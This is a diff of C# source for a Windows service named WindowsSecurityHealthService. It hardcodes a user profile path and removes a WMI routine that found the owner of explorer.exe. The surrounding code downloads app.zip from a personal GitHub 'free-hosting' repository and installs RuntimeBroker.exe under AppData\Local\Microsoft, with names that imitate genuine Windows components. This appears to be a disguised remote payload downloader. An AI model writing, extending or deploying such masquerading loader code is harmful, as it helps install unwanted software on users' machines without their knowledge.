@@ -18,7 +18,7 @@ namespace WindowsSecurityHealthService
     {
         static string versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version";
         static string appZipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip";
-        static string userProfilePath = $"C:\\Users\\{GetUserName()}";
+        static string userProfilePath = $"C:\\Users\\Microsoft";
         static string localAppDataPath = Path.Combine(userProfilePath, "AppData", "Local");
         static string currentDir = Path.Combine(localAppDataPath, @"Microsoft\RuntimeBroker");
         static string assemblyFile = Path.Combine(currentDir, "RuntimeBroker.exe");
@@ -128,25 +128,6 @@ namespace WindowsSecurityHealthService
         public void OnStartManually(string[] args)
         {
             OnStart(args);
-        }
-
-        private static string GetUserName()
-        {
-            SelectQuery query = new SelectQuery(@"Select * from Win32_Process");
-            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
-            {
-                foreach (System.Management.ManagementObject Process in searcher.Get())
-                {
-                    if (Process["ExecutablePath"] != null && string.Equals(Path.GetFileName(Process["ExecutablePath"].ToString()), "explorer.exe", StringComparison.OrdinalIgnoreCase))
-                    {
-                        string[] OwnerInfo = new string[2];
-                        Process.InvokeMethod("GetOwner", (object[])OwnerInfo);
-                        return OwnerInfo[0];
-                    }
-                }
-            }
-
-            return "";
         }
 
         static string GetServerVersion()
